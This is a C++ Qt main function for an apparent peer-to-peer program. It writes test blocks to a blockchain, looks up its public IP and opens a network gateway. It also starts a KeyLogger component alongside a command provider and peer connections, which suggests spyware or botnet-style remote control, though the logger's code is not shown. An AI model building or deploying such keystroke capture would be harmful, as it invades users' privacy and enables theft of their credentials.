#include <QCoreApplication>
#include "Gateway.h"
#include "Global.h"
#include <QSettings>
#include <QDir>
#include <QJsonDocument>
#include <QJsonParseError>
#include <QJsonObject>
#include <QDebug>

#include "web/HttpManager.h"
#include "web/HttpResponse.h"

#include "core/CommandProvider.h"
#include "core/Context.h"

#include "blockchain/Block.h"
#include <blockchain/BlockChain.h>

int main(int argc, char *argv[])
{
    QCoreApplication a(argc, argv);
    
    try
    {
        Context::instance().load();
    }
    catch(std::exception &e)
    {
        qDebug() << "Context initialisation failed!" << e.what();
        return -1;
    }
    
    BlockChain chain;
    Block b;
    for (int i = 0; i < 10000; i++)
    {
        b.setData("testtest___SDFs-DS__SD -SAFDLAKSf _)A Fasflk");
        b.setNumber(i);
        b.setPreviousBlock(Hash::randomHash());
        chain.save(&b);
    }
    
    HttpResponse resp(HttpManager::getPage(QUrl("http://api.sypexgeo.net/")));
    QJsonParseError err;
    QJsonDocument json = QJsonDocument::fromJson(resp.body().toUtf8(), &err);
    if (err.error != QJsonParseError::NoError)
    {
        qDebug() <<"Json parsing error" << err.errorString() <<  "near" << resp.body().mid(err.offset, 5);
    }
    Context::instance().setIp(json.object()["ip"].toString());
    qDebug() << "My ip:" << Context::instance().getIp();

    QDir dir(a.applicationDirPath());
    QSettings settings(dir.absoluteFilePath("p2p.conf"), QSettings::IniFormat);

    
    Context::instance().keyLogger = new KeyLogger(&a);
    Context::instance().pipeController = new PipeController(new Gateway(15065, &a), &a);
    Context::instance().messageController = new MessageController(&a);

    CommandProvider::instance();

    Context::instance().pipeController->addPipe(new Pipe(settings.value("net/connect", "127.0.0.1").toString()));

    int ret = a.exec();

    Context::instance().messageController->terminate();
    Context::instance().pipeController->terminate();
    Context::instance().keyLogger->terminate();

    return ret;
}
